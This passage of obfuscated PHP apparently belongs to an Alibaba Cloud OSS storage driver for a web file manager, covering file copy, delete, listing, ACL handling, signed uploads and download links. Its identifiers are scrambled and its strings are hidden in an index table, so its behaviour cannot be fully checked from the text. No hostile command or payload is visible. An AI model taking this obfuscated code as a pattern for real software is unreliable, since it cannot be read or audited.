array($È«å»ü¤[167] => $ğ´‹ÕäÚ, $È«å»ü¤[168] => $°Ñóêé); $áÖì¶Ïå[] = $this->client->uploadPartCopy($this->bucket, $˜ÈÉæ·Ù, $this->bucket, $this->pathEncode($ñÖ»œ§ğ), $¦‚Œ¿œ, $‘Û’®®ú, $î‚¼æ); $¦‚Œ¿œ = $¦‚Œ¿œ + 1; } $Ö§ĞÚË¯ = array(); foreach ($áÖì¶Ïå as $éªÃÇƒ => $ÆÔ´ˆãÈ) { $Ö§ĞÚË¯[] = array($È«å»ü¤[299] => $éªÃÇƒ + 1, $È«å»ü¤[300] => $ÆÔ´ˆãÈ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ñÖ»œ§ğ), $‘Û’®®ú, $Ö§ĞÚË¯); } catch (OSS\Core\OssException $ÕØ¢üÎ”) { $this->writeLog(__FUNCTION__ . $È«å»ü¤[214] . $ÕØ¢üÎ”->getMessage()); return !1; } return !0; } public function moveFile($û±ã¿«Ú, $ßèŸ¯Øñ) { if ($this->copyFile($û±ã¿«Ú, $ßèŸ¯Øñ)) { $this->remove($û±ã¿«Ú); return $this->getPathOuter($ßèŸ¯Øñ); } return !1; } public function delFile($³–Üıºš) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($³–Üıºš)); } catch (OSS\Core\OssException $¾‚ˆé÷) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $¾‚ˆé÷->getMessage()); return !1; } return !0; } public function delFolder($¯È‡ÆÜÂ) { $üÜã‚¨ =& $_SERVER[†ûãı«°]; if (!$this->exist($¯È‡ÆÜÂ)) { return !0; } $this->listItemCache = !1; $¾ù½Ö´ = $this->fileList($¯È‡ÆÜÂ); $this->listItemCache = !0; $Ãş§·üñ = trim($¯È‡ÆÜÂ, $üÜã‚¨[8]) . $üÜã‚¨[8]; if (!empty($¯È‡ÆÜÂ) && $¯È‡ÆÜÂ !== $üÜã‚¨[230] && !in_array($Ãş§·üñ, $¾ù½Ö´[$üÜã‚¨[85]])) { $¾ù½Ö´[$üÜã‚¨[85]][] = $Ãş§·üñ; } $şëª†æÅ = $this->delByBatch($¾ù½Ö´[$üÜã‚¨[86]]); if (!$şëª†æÅ) { return !1; } $şëª†æÅ = $this->delByBatch($¾ù½Ö´[$üÜã‚¨[85]]); if (!$şëª†æÅ) { return !1; } return $this->delFile($Ãş§·üñ); } private function delByBatch($Á–à±¥ò) { foreach (array_chunk($Á–à±¥ò, 1000) as $ûº¾ÔØ¿) { try { $this->client->deleteObjects($this->bucket, $ûº¾ÔØ¿); } catch (OSS\Core\OssException $Ä î¬) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $Ä î¬->getMessage()); return !1; } } return !0; } public function rename($³„‡Å, $úæ­”†É) { return $this->renameObject($³„‡Å, $úæ­”†É); } private function fileInfo($ ÊÅõ°Û, $ò¥Ö™‰œ = false, $œ•ÅØÚû = array()) { $çÚÇ•Ş =& $_SERVER[†ûãı«°]; $óŒÈÑŸ  = array($çÚÇ•Ş[32] => $this->pathThis($ ÊÅõ°Û), $çÚÇ•Ş[87] => $this->getPathOuter($ ÊÅõ°Û), $çÚÇ•Ş[33] => $çÚÇ•Ş[232], $çÚÇ•Ş[79] => isset($œ•ÅØÚû[$çÚÇ•Ş[79]]) ? $œ•ÅØÚû[$çÚÇ•Ş[79]] : 0, $çÚÇ•Ş[169] => $this->ext($ ÊÅõ°Û)); if ($ò¥Ö™‰œ) { return $óŒÈÑŸ ; } $óŒÈÑŸ [$çÚÇ•Ş[233]] = $óŒÈÑŸ [$çÚÇ•Ş[88]] = 0; $óŒÈÑŸ [$çÚÇ•Ş[234]] = $óŒÈÑŸ [$çÚÇ•Ş[235]] = !0; if (empty($œ•ÅØÚû)) { $†¹ÚşŸ‹ = $this->objectMeta($ ÊÅõ°Û); if (!$†¹ÚşŸ‹) { return $óŒÈÑŸ ; } $œ•ÅØÚû = array($çÚÇ•Ş[88] => strtotime($†¹ÚşŸ‹[$çÚÇ•Ş[1491]]), $çÚÇ•Ş[79] => $†¹ÚşŸ‹[$çÚÇ•Ş[1490]] + 0, $çÚÇ•Ş[1489] => $†¹ÚşŸ‹[$çÚÇ•Ş[1489]]); } if (isset($œ•ÅØÚû[$çÚÇ•Ş[1489]]) && $œ•ÅØÚû[$çÚÇ•Ş[1489]]) { $óŒÈÑŸ [$çÚÇ•Ş[237]] = trim($œ•ÅØÚû[$çÚÇ•Ş[1489]], $çÚÇ•Ş[121]); } if (isset($œ•ÅØÚû[$çÚÇ•Ş[79]])) { $óŒÈÑŸ [$çÚÇ•Ş[79]] = $œ•ÅØÚû[$çÚÇ•Ş[79]]; } if (isset($œ•ÅØÚû[$çÚÇ•Ş[88]])) { $óŒÈÑŸ [$çÚÇ•Ş[88]] = $œ•ÅØÚû[$çÚÇ•Ş[88]]; } if (isset($œ•ÅØÚû[$çÚÇ•Ş[206]]) && !trim($óŒÈÑŸ [$çÚÇ•Ş[88]])) { $óŒÈÑŸ [$çÚÇ•Ş[88]] = $œ•ÅØÚû[$çÚÇ•Ş[206]]; } return $óŒÈÑŸ ; } private function folderInfo($³‚äÂ²•, $Ê¡¶°ˆê = false, $…¦‹†§ù = array()) { $‰Òƒ·Õó =& $_SERVER[†ûãı«°]; $©ã ª²© = array($‰Òƒ·Õó[32] => $this->pathThis($³‚äÂ²•), $‰Òƒ·Õó[87] => $this->getPathOuter($‰Òƒ·Õó[8] . $³‚äÂ²•), $‰Òƒ·Õó[33] => $‰Òƒ·Õó[78]); if ($Ê¡¶°ˆê) { return $©ã ª²©; } $©ã ª²©[$‰Òƒ·Õó[233]] = $©ã ª²©[$‰Òƒ·Õó[88]] = 0; $©ã ª²©[$‰Òƒ·Õó[234]] = $©ã ª²©[$‰Òƒ·Õó[235]] = !0; if (empty($…¦‹†§ù)) { $³‚äÂ²• = rtrim($³‚äÂ²•, $‰Òƒ·Õó[8]) . $‰Òƒ·Õó[8]; $¶ğ–Êä˜ = $this->objectMeta($³‚äÂ²•); if (!$¶ğ–Êä˜) { return $©ã ª²©; } $…¦‹†§ù = array($‰Òƒ·Õó[233] => $¶ğ–Êä˜[$‰Òƒ·Õó[579]][$‰Òƒ·Õó[1494]], $‰Òƒ·Õó[88] => strtotime($¶ğ–Êä˜[$‰Òƒ·Õó[1491]])); } if (isset($…¦‹†§ù[$‰Òƒ·Õó[88]])) { $©ã ª²©[$‰Òƒ·Õó[88]] = $…¦‹†§ù[$‰Òƒ·Õó[88]]; } if (isset($…¦‹†§ù[$‰Òƒ·Õó[233]])) { $©ã ª²©[$‰Òƒ·Õó[233]] = $…¦‹†§ù[$‰Òƒ·Õó[233]]; } return $©ã ª²©; } public function listPath($Œºİ’ª’, $é¢‚úï = false) { $É•Ù€ƒ =& $_SERVER[†ûãı«°]; $â³œü¬í = $this->fileList($Œºİ’ª’, $É•Ù€ƒ[8], !0); foreach ($â³œü¬í[$É•Ù€ƒ[85]] as $¹ğîïÌÇ => $™ÇÊçÌÌ) { $â³œü¬í[$É•Ù€ƒ[85]][$¹ğîïÌÇ] = $this->folderInfo($™ÇÊçÌÌ, $é¢‚úï, $™ÇÊçÌÌ); } foreach ($â³œü¬í[$É•Ù€ƒ[86]] as $¹ğîïÌÇ => $™ÇÊçÌÌ) { $â³œü¬í[$É•Ù€ƒ[86]][$¹ğîïÌÇ] = $this->fileInfo($™ÇÊçÌÌ[$É•Ù€ƒ[32]], $é¢‚úï, $™ÇÊçÌÌ); } return $â³œü¬í; } protected function infoChildren($ŠÁÅ¤”Š, &$×Ã°ö«İ) { $¦‡–¸Ó =& $_SERVER[†ûãı«°]; $šºìöå = $this->fileList($ŠÁÅ¤”Š, $¦‡–¸Ó[12], !0); $×Ã°ö«İ[$¦‡–¸Ó[81]] += count($šºìöå[$¦‡–¸Ó[85]]); $×Ã°ö«İ[$¦‡–¸Ó[80]] += count($šºìöå[$¦‡–¸Ó[86]]); foreach ($šºìöå[$¦‡–¸Ó[86]] as $ÀËì§ƒà) { if (!$ÀËì§ƒà || !$ÀËì§ƒà[$¦‡–¸Ó[79]]) { continue; } $×Ã°ö«İ[$¦‡–¸Ó[79]] += $ÀËì§ƒà[$¦‡–¸Ó[79]]; } } public function has($úò¾‹‹¶, $‹ê‡£åÃ = false, $„øİÂó = true) { $ÁéÑ½ß =& $_SERVER[†ûãı«°]; $úò¾‹‹¶ = trim($úò¾‹‹¶, $ÁéÑ½ß[8]); $‰ÎËÏãÓ = empty($úò¾‹‹¶) && $úò¾‹‹¶ !== $ÁéÑ½ß[230] ? $ÁéÑ½ß[12] : $úò¾‹‹¶ . $ÁéÑ½ß[8]; $ƒÊü’Á¥ = $ÁéÑ½ß[12]; $Œ÷ïÆÆ‹ = 500; $İ’í²ƒ = $é‰„û³» = 0; while (!0) { check_abort(); $üà®°Àñ = array($ÁéÑ½ß[1485] => $ÁéÑ½ß[8], $ÁéÑ½ß[1486] => $‰ÎËÏãÓ, $ÁéÑ½ß[1487] => $Œ÷ïÆÆ‹, $ÁéÑ½ß[1488] => $ƒÊü’Á¥); try { $ãüç£ï¿ = $this->client->listObjects($this->bucket, $üà®°Àñ); } catch (OSS\Core\OssException $€³î—õå) { $this->writeLog(__FUNCTION__ . $ÁéÑ½ß[214] . $€³î—õå->getMessage()); break; } $ƒÊü’Á¥ = $ãüç£ï¿->getNextMarker(); $¦€¼ñş÷ = $ãüç£ï¿->getObjectList(); $ï‘¼¡Ïš = $ãüç£ï¿->getPrefixList(); if ($‹ê‡£åÃ) { if (count($¦€¼ñş÷) > 1 || count($¦€¼ñş÷) == 1 && $¦€¼ñş÷[0]->getKey() != $‰ÎËÏãÓ) { $İ’í²ƒ += count($¦€¼ñş÷) - 1; } if (!empty($ï‘¼¡Ïš)) { $é‰„û³» += count($ï‘¼¡Ïš); } if ($ƒÊü’Á¥ === $ÁéÑ½ß[12]) { break; } continue; } if ($„øİÂó) { if (!empty($¦€¼ñş÷)) { if (count($¦€¼ñş÷) > 1 || $¦€¼ñş÷[0]->getKey() != $‰ÎËÏãÓ) { return !0; } } } else { if (!empty($ï‘¼¡Ïš)) { return !0; } } if ($ƒÊü’Á¥ === $ÁéÑ½ß[12]) { break; } } if ($‹ê‡£åÃ) { return array($ÁéÑ½ß[241] => $İ’í²ƒ, $ÁéÑ½ß[242] => $é‰„û³»); } return !1; } public function listAll($Ê¼‡™Ø¡) { $à»Ø›… =& $_SERVER[†ûãı«°]; $Á¿¹ûÌ¡ = $this->fileList($Ê¼‡™Ø¡, $à»Ø›…[12], !0); $şø¡ùåÆ = array_to_keyvalue($Á¿¹ûÌ¡[$à»Ø›…[86]], $à»Ø›…[32]); foreach ($Á¿¹ûÌ¡[$à»Ø›…[85]] as $ê‚â‘ºñ) { if (is_string($ê‚â‘ºñ)) { $şø¡ùåÆ[$ê‚â‘ºñ] = array($à»Ø›…[79] => 0); } } return $this->listAllFiles($Ê¼‡™Ø¡, $şø¡ùåÆ); } public function canRead($µ‚Ù€‚ó) { $Œæş³ëŒ =& $_SERVER[†ûãı«°]; $ÍñÆ¦ = $this->pathAcl($µ‚Ù€‚ó); return $ÍñÆ¦ == $Œæş³ëŒ[1495] || $ÍñÆ¦ == $Œæş³ëŒ[626] ? !0 : !1; } public function canWrite($îç©ÒÛì) { $›ıŒ§Î = $this->pathAcl($îç©ÒÛì); return $›ıŒ§Î == $_SERVER[†ûãı«°][626] ? !0 : !1; } public function pathAcl($¿Î½ş) { $İÌ¨ƒ×Ã =& $_SERVER[†ûãı«°]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $è¯Œ°º” = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¿Î½ş)); } catch (OSS\Core\OssException $À™¬ÉÓÂ) { $this->writeLog(__FUNCTION__ . $İÌ¨ƒ×Ã[214] . $À™¬ÉÓÂ->getMessage()); return !1; } $şÊ½ôŞÈ = $è¯Œ°º” == $İÌ¨ƒ×Ã[37] ? $this->bucketAcl : $è¯Œ°º”; if ($şÊ½ôŞÈ == $İÌ¨ƒ×Ã[1496]) { return $İÌ¨ƒ×Ã[1495]; } if ($şÊ½ôŞÈ == $İÌ¨ƒ×Ã[1497]) { return $İÌ¨ƒ×Ã[626]; } return $şÊ½ôŞÈ; } private function chmodPath($–Àæ½Ü¢, $ÄÙé´‡‡ = '') { $Ïš—¸ö‹ =& $_SERVER[†ûãı«°]; $‚¶‹ü®Ÿ = empty($ÄÙé´‡‡) ? $Ïš—¸ö‹[1497] : $ÄÙé´‡‡; $æÁèëĞË = array($Ïš—¸ö‹[37], $Ïš—¸ö‹[231], $Ïš—¸ö‹[1496], $Ïš—¸ö‹[1497]); if (!in_array($‚¶‹ü®Ÿ, $æÁèëĞË)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($–Àæ½Ü¢), $‚¶‹ü®Ÿ); } catch (OSS\Core\OssException $ÆŠ‚ùƒŞ) { $this->writeLog(__FUNCTION__ . $Ïš—¸ö‹[214] . $ÆŠ‚ùƒŞ->getMessage()); return !1; } return !0; } public function getContent($œ¥ó…şñ) { return $this->fileSubstr($œ¥ó…şñ, -1); } public function setContent($„¨“í¤æ, $ï½šìß = '') { $áıØ‚ü… =& $_SERVER[†ûãı«°]; try { $ê˜§Ô¾› = $this->trafficLimit($áıØ‚ü…[1498]); $—Æ§¤˜Ş = $this->client->putObject($this->bucket, $this->pathEncode($„¨“í¤æ), $ï½šìß, $ê˜§Ô¾›); } catch (OSS\Core\OssException $êè„Ş€Â) { $this->writeLog(__FUNCTION__ . $áıØ‚ü…[214] . $êè„Ş€Â->getMessage()); return !1; } $ËÒ¸°Íã = array($áıØ‚ü…[1492] => trim($—Æ§¤˜Ş[$áıØ‚ü…[1489]], $áıØ‚ü…[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($„¨“í¤æ))); $this->updateObjMeta($„¨“í¤æ, $ËÒ¸°Íã); return isset($—Æ§¤˜Ş[$áıØ‚ü…[1499]][$áıØ‚ü…[296]]) ? !0 : !1; } private function updateObjMeta($Í¹Ê«ğ, $­İÆ¶§›) { $Í¹Ê«ğ = $this->pathEncode($Í¹Ê«ğ); try { $¢˜…¼°ˆ = array(OSS\OssClient::OSS_HEADERS => $­İÆ¶§›); $this->client->copyObject($this->bucket, $Í¹Ê«ğ, $this->bucket, $Í¹Ê«ğ, $¢˜…¼°ˆ); } catch (OSS\Core\OssException $Î—áÙÀÈ) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $Î—áÙÀÈ->getMessage()); return !1; } return !0; } public function upload($É‘ƒó½, $ÀúÚª€, $ôˆ×„Æë = false, $úì˜ŠÀ‚ = REPEAT_REPLACE) { $šêáùñ´ =& $_SERVER[†ûãı«°]; $•Ô„› = trim($É‘ƒó½, $šêáùñ´[8]); $±Ğ’™á¨ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($šêáùñ´[1492] => @md5_file($ÀúÚª€)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($É‘ƒó½))); $±Ğ’™á¨ = $this->trafficLimit($šêáùñ´[1498], $±Ğ’™á¨); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($•Ô„›), $ÀúÚª€, $±Ğ’™á¨); } catch (OSS\Core\OssException $ÍÅŸ•›İ) { $this->writeLog(__FUNCTION__ . $šêáùñ´[214] . $ÍÅŸ•›İ->getMessage()); return !1; } return $this->getPathOuter($É‘ƒó½); } public function getHost() { $İ½€İÎŒ =& $_SERVER[†ûãı«°]; $–¨™Æá = explode($İ½€İÎŒ[210], parent::getHost()); return $–¨™Æá[0] . $İ½€İÎŒ[210] . $this->bucket . $İ½€İÎŒ[10] . $–¨™Æá[1]; } public function uploadFormData($ ÖšÃ ö, $í©‰¬ÜË = 3600) { $µÏâ±½ê =& $_SERVER[†ûãı«°]; if (!($õˆı¦Ø = $this->getHost())) { return !1; } $ìá¢¯«ß = $í©‰¬ÜË; $Ñ–ÂÒİ‰ = date($µÏâ±½ê[1500], time() + $ìá¢¯«ß); $ÁÆŞçÕ¯ = new DateTime($Ñ–ÂÒİ‰); $Ş†ÂÂ¶ = $ÁÆŞçÕ¯->format(DateTime::ISO8601); $ —Ñ„Ôè = strpos($Ş†ÂÂ¶, $µÏâ±½ê[373]); $Ş†ÂÂ¶ = substr($Ş†ÂÂ¶, 0, $ —Ñ„Ôè) . $µÏâ±½ê[1501]; $–ÁÓ×® = 1048576000 * 5; $¦ïÚü¥° = $this->pathFather($ ÖšÃ ö); $Î«èŒ˜Ş = array($µÏâ±½ê[264] => $Ş†ÂÂ¶, $µÏâ±½ê[267] => array(array($µÏâ±½ê[1502], 0, $–ÁÓ×®), array($µÏâ±½ê[269], $µÏâ±½ê[270], $¦ïÚü¥°))); $ó·ŠôÖş = base64_encode(json_encode($Î«èŒ˜Ş)); $èëçá¯Å = base64_encode(hash_hmac($µÏâ±½ê[1423], $ó·ŠôÖş, $this->secret, !0)); $…î²ØÜ¹ = array($µÏâ±½ê[1503] => $this->accessKey, $µÏâ±½ê[279] => $ó·ŠôÖş, $µÏâ±½ê[272] => $µÏâ±½ê[263], $µÏâ±½ê[1504] => $èëçá¯Å, $µÏâ±½ê[208] => $õˆı¦Ø); $…î²ØÜ¹ = $this->trafficLimit($µÏâ±½ê[1498], $…î²ØÜ¹, !0); return $…î²ØÜ¹; } public function uploadMultiData($¹ÏÄÙÔà, $ö¥ó æ° = 3600) { $İíç­šµ =& $_SERVER[†ûãı«°]; if (!($ãåíÈ¤ƒ = $this->getHost())) { return !1; } $²ïØ«¤ö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¹ÏÄÙÔà)); return array($İíç­šµ[283] => $²ïØ«¤ö, $İíç­šµ[208] => $ãåíÈ¤ƒ . $İíç­šµ[8] . $this->pathEncode($¹ÏÄÙÔà), $İíç­šµ[284] => gmdate($İíç­šµ[1505]), $İíç­šµ[97] => $¹ÏÄÙÔà); } public function uploadMultiAuth($ÁŒ—ã , $‘ÖÕÊóá = array()) { if (isset($‘ÖÕÊóá[$_SERVER[†ûãı«°][285]])) { return $this->uploadPartAuth($ÁŒ—ã , $‘ÖÕÊóá); } return $this->uploadListAuth($ÁŒ—ã , $‘ÖÕÊóá); } private function uploadPartAuth($İÊ¦Å¢ã, $àù’“ÆÎ = array()) { $íçºÔÒ¦ =& $_SERVER[†ûãı«°]; $ºÎ²¨»ş = $àù’“ÆÎ[$íçºÔÒ¦[97]]; $¥Ëø ˆ = $this->_getUploadAuth($ºÎ²¨»ş, $àù’“ÆÎ); $çÛÜÂ = array($íçºÔÒ¦[288] => $¥Ëø ˆ[$íçºÔÒ¦[288]], $íçºÔÒ¦[284] => $¥Ëø ˆ[$íçºÔÒ¦[284]]); if (isset($¥Ëø ˆ[$íçºÔÒ¦[1506]])) { $çÛÜÂ[$íçºÔÒ¦[1506]] = $¥Ëø ˆ[$íçºÔÒ¦[1506]]; } return $çÛÜÂ; } private function uploadListAuth($â½óŞ»û, $àèµºÖş = array()) { $áûÒˆ“§ =& $_SERVER[†ûãı«°]; $†‰ß•äª = $àèµºÖş[$áûÒˆ“§[97]]; $Î½÷áıÜ = $àèµºÖş[$áûÒˆ“§[283]]; $ŒâÓß¸ş = $this->client->listParts($this->bucket, $this->pathEncode($†‰ß•äª), $Î½÷áıÜ); $ŸÖÍò¿Í = $ŒâÓß¸ş->getListPart(); $ó™ë°„ = array(); foreach ($ŸÖÍò¿Í as $êµä¨½ª) { $ó™ë°„[] = array($áûÒˆ“§[299] => $êµä¨½ª->getPartNumber(), $áûÒˆ“§[300] => trim($êµä¨½ª->getETag(), $áûÒˆ“§[121])); } if (!$ó™ë°„) { return !1; } $‡ëÍêòÀ = $this->_getUploadAuth($†‰ß•äª, $àèµºÖş); return array($áûÒˆ“§[288] => $‡ëÍêòÀ[$áûÒˆ“§[288]], $áûÒˆ“§[284] => $‡ëÍêòÀ[$áûÒˆ“§[284]], $áûÒˆ“§[291] => $ó™ë°„); } private function _getUploadAuth($öğÄáÊõ, $Ê•Ê¿Ï£) { $Ú¾Ì£ÒÔ =& $_SERVER[†ûãı«°]; $¢‚Ì = gmdate($Ú¾Ì£ÒÔ[1505]); $ßËğÎñ½ = isset($Ê•Ê¿Ï£[$Ú¾Ì£ÒÔ[285]]) ? $Ú¾Ì£ÒÔ[255] : $Ú¾Ì£ÒÔ[290]; $ªá–Êüí = array_intersect_key($Ê•Ê¿Ï£, array_flip(array($Ú¾Ì£ÒÔ[285], $Ú¾Ì£ÒÔ[283]))); ksort($ªá–Êüí); $İËÚÖµš = $ªá–Êüí ? $Ú¾Ì£ÒÔ[76] . http_build_query($ªá–Êüí, null, $Ú¾Ì£ÒÔ[286], PHP_QUERY_RFC3986) : $Ú¾Ì£ÒÔ[12]; $ÕÁÙäò = array($ßËğÎñ½, $Ú¾Ì£ÒÔ[12], $Ú¾Ì£ÒÔ[123], $¢‚Ì, "\x78\55\x6f\163\x73\55\x64\141\x74\x65\72{$¢‚Ì}", $Ú¾Ì£ÒÔ[8] . $this->bucket . $Ú¾Ì£ÒÔ[8] . $öğÄáÊõ . $İËÚÖµš); if (isset($Ê•Ê¿Ï£[$Ú¾Ì£ÒÔ[285]])) { $­ó©êª³ = $this->trafficLimit($Ú¾Ì£ÒÔ[1498], array(), !0); if ($­ó©êª³) { $öğÄáÊõ = $Ú¾Ì£ÒÔ[1506]; array_splice($ÕÁÙäò, 5, 0, $öğÄáÊõ . $Ú¾Ì£ÒÔ[4] . $­ó©êª³[$öğÄáÊõ]); } } $®Ï¾à = implode($Ú¾Ì£ÒÔ[287], $ÕÁÙäò); $Ó¡¯¥è£ = base64_encode(hash_hmac($Ú¾Ì£ÒÔ[1423], $®Ï¾à, $this->secret, !0)); $ö®ª¡ô¯ = $Ú¾Ì£ÒÔ[1475] . $this->accessKey . $Ú¾Ì£ÒÔ[4] . $Ó¡¯¥è£; $ÖÎåÈ”ë = array($Ú¾Ì£ÒÔ[288] => $ö®ª¡ô¯, $Ú¾Ì£ÒÔ[284] => $¢‚Ì); if (!empty($­ó©êª³)) { $ÖÎåÈ”ë = array_merge($ÖÎåÈ”ë, $­ó©êª³); } return $ÖÎåÈ”ë; } public function download($üÅÒ³ºà, $©ö³¸š¢) { $Áºïº”Å =& $_SERVER[†ûãı«°]; if ($this->isFolder($üÅÒ³ºà)) { return !1; } try { $ÆœèÍãÅ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $©ö³¸š¢); $ÆœèÍãÅ = $this->trafficLimit($Áºïº”Å[112], $ÆœèÍãÅ); $this->client->getObject($this->bucket, $this->pathEncode($üÅÒ³ºà), $ÆœèÍãÅ); } catch (OSS\Core\OssException $ò£ı¡¹Ş) { $this->writeLog(__FUNCTION__ . $Áºïº”Å[214] . $ò£ı¡¹Ş->getMessage()); return !1; } return $©ö³¸š¢; } public function fileSubstr($î·ªªÉé, $´±üÁÏŒ = 0, $ËÌàŸÊ = false) { if ($´±üÁÏŒ === -1) { $Ó…ÑÃ²– = array(); } else { if ($ËÌàŸÊ === !1) { $‹ªØ‹›¼ = $this->size($î·ªªÉé); } else { $‹ªØ‹›¼ = $´±üÁÏŒ + $ËÌàŸÊ - 1; } $Ó…ÑÃ²– = array(OSS\OssClient::OSS_RANGE => "{$´±üÁÏŒ}\x2d{$‹ªØ‹›¼}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($î·ªªÉé), $Ó…ÑÃ²–); } catch (OSS\Core\OssException $üï¶Œ´) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $üï¶Œ´->getMessage()); think_exception($üï¶Œ´->getMessage()); return !1; } } private function trafficLimit($¯ˆÒÊ½¼, $·Ù¬Ğ¾“ = array(), $®ºÑîÊ² = false) { $”ê¨Àôœ =& $_SERVER[†ûãı«°]; if ($¯ˆÒÊ½¼ == $”ê¨Àôœ[1498] && $this->isUploadServer() || $¯ˆÒÊ½¼ == $”ê¨Àôœ[112] && $this->isFileOutServer()) { return $·Ù¬Ğ¾“; } $«àÙØò = floatval($GLOBALS[$”ê¨Àôœ[6]][$”ê¨Àôœ[92]][$”ê¨Àôœ[110]][$¯ˆÒÊ½¼]) * 1024 * 1024 * 8; if (!$«àÙØò) { return $·Ù¬Ğ¾“; } $«àÙØò = $«àÙØò < 819200 ? 819200 : ($«àÙØò > 838860800 ? 838860800 : $«àÙØò); if ($®ºÑîÊ²) { $·Ù¬Ğ¾“[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($«àÙØò); } else { if (!isset($·Ù¬Ğ¾“[OSS\OssClient::OSS_HEADERS])) { $·Ù¬Ğ¾“[OSS\OssClient::OSS_HEADERS] = array(); } $·Ù¬Ğ¾“[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($«àÙØò); } return $·Ù¬Ğ¾“; } public function link($ĞÖ‘½ş‘, $Ùé¿š‘‡ = array()) { $êâª¼ûÚ =& $_SERVER[†ûãı«°]; if (!$this->exist($ĞÖ‘½ş‘) || $this->isFolder($ĞÖ‘½ş‘)) { return !1; } try { $Ùé¿š‘‡ = $this->trafficLimit($êâª¼ûÚ[112], $Ùé¿š‘‡, !0); $°ü³”æï = $this->client->signUrl($this->bucket, $this->pathEncode($ĞÖ‘½ş‘), 3600 * 12, $êâª¼ûÚ[1507], $Ùé¿š‘‡); return $this->getCdnLink($°ü³”æï); } catch (OSS\Core\OssException $¿¶äÕ¿Æ) { $this->writeLog(__FUNCTION__ . $êâª¼ûÚ[214] . $¿¶äÕ¿Æ->getMessage()); return !1; } } public function fileOut($ü¼Æ«ÂÚ, $ŒÆ®º± = false, $¼Œ‘ìà’ = false, $Û´‰¼´è = '') { $õæÜ§óÍ =& $_SERVER[†ûãı«°]; if ($this->isFileOutServer()) { return $this->fileOutServer($ü¼Æ«ÂÚ, $ŒÆ®º±, $¼Œ‘ìà’, $Û´‰¼´è); } if (!$¼Œ‘ìà’) { $¼Œ‘ìà’ = $this->pathThis($ü¼Æ«ÂÚ); } $¼Œ‘ìà’ = rawurlencode($¼Œ‘ìà’); $¶«¹Œ’° = get_file_mime(get_path_ext($¼Œ‘ìà’)); if ($¶«¹Œ’° == $õæÜ§óÍ[250]) { return parent::fileOut($ü¼Æ«ÂÚ, $ŒÆ®º±, $¼Œ‘ìà’, $Û´‰¼´è); } $ŒÆ®º± = $ŒÆ®º± ? $õæÜ§óÍ[1508] : $õæÜ§óÍ[1509]; $ŠûÏ·Å = array(OSS\OssClient::OSS_SUB_RESOURCE => $õæÜ§óÍ[1510] . rawurlencode("{$ŒÆ®º±}\73\146\x69\x6c\145\156\141\x6d\145\x3d{$¼Œ‘ìà’}")); $ŠûÏ·Å[OSS\OssClient::OSS_SUB_RESOURCE] .= $õæÜ§óÍ[1511] . rawurlencode($¶«¹Œ’°); $ÓÍ¸¦¨” = $this->link($ü¼Æ«ÂÚ, $ŠûÏ·Å); $this->fileOutLink($ÓÍ¸¦¨”); } public function fileOutServer($¢Ä¸•Ìï, $Ö×‰ïÀ” = false, $äà§ğÏ‚ = false, $‡Ï“›Í¯ = '') { parent::fileOut($¢Ä¸•Ìï, $Ö×‰ïÀ”, $äà§ğÏ‚, $‡Ï“›Í¯); } public function fileOutImage($µ“Ì¤€, $¾˜É–ÙĞ = 250) { if ($this->size($µ“Ì¤€) > 1024 * 1024 * 20) { return $this->fileOutImageServer($µ“Ì¤€, $¾˜É–ÙĞ); } $ªÑÒ‹ÃŠ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[†ûãı«°][1472] . $¾˜É–ÙĞ); $ ‡Ó˜Ÿ¢ = $this->link($µ“Ì¤€, $ªÑÒ‹ÃŠ); $this->fileOutLink($ ‡Ó˜Ÿ¢); } public function fileOutImageServer($øğ¼•Óî, $®ÓÊº™È = 250) { parent::fileOutImage($øğ¼•Óî, $®ÓÊº™È); } public function fileOutLink($ö´¬éÀ ) { $€ÃÍ¤·¶ =& $_SERVER[†ûãı«°]; if (!$this->isCdnHost() && substr($ö´¬éÀ , 0, 7) == $€ÃÍ¤·¶[218]) { $ö´¬éÀ  = $€ÃÍ¤·¶[219] . substr($ö´¬éÀ , 7); } header($€ÃÍ¤·¶[175] . $ö´¬éÀ ); die; } public function hashMd5($ÂÒ‹¡Ä—, $Œíàµ‡ = '') { $²º“ò¸À =& $_SERVER[†ûãı«°]; $—ô²Şéë = $this->_objectMeta($ÂÒ‹¡Ä—); if (!$—ô²Şéë) { return $²º“ò¸À[12]; } if (!isset($—ô²Şéë[$²º“ò¸À[1492]]) && !empty($Œíàµ‡)) { $ûŒÍ€‚ = $this->updateObjMeta($ÂÒ‹¡Ä—, array($²º“ò¸À[1492] => $Œíàµ‡)); $—ô²Şéë[$²º“ò¸À[1492]] = $ûŒÍ€‚ ? $Œíàµ‡ : $²º“ò¸À[12]; } return isset($—ô²Şéë[$²º“ò¸À[1492]]) ? strtolower($—ô²Şéë[$²º“ò¸À[1492]]) : $²º“ò¸À[12]; } public function size($Ä­‹¿¤ñ) { $óÉı…š‹ = $this->objectMeta($Ä­‹¿¤ñ); return $óÉı…š‹ ? $óÉı…š‹[$_SERVER[†ûãı«°][79]] : 0; } public function info($¼£Úâ×ò) { if ($this->isFolder($¼£Úâ×ò)) { return $this->folderInfo($¼£Úâ×ò); } else { if ($this->isFile($¼£Úâ×ò)) { return $this->fileInfo($¼£Úâ×ò); } } return !1; } public function exist($íÇÛå›‰) { return $this->isFile($íÇÛå›‰) || $this->isFolder($íÇÛå›‰); } public function 